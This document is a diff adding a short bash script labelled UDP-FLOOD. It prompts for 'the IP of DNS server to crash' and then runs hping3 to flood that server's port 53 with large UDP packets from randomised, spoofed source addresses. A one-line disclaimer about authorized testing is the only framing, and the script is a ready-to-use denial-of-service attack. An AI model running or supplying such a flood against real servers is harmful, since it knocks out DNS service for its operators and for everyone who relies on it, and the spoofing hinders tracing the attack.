@@ -1,0 +1,13 @@
+#!/usr/bin/bash
+figlet UDP-FLOOD
+echo "                                                        "
+echo "--------------------------------------------------------------------"
+echo "| This script uses hping3 , so make sure to install it !!          |"
+echo "| DISCLAIMER: This script is for authorized testing and educational|"
+echo "| purpose only , we are not responsible for any kind of misuse !!  |"
+echo "--------------------------------------------------------------------"
+echo "                                                        "
+echo "Enter the IP of DNS server to crash : "
+read ip
+hping3 --flood --rand-source --udp -p 53 $ip -d 100000
+
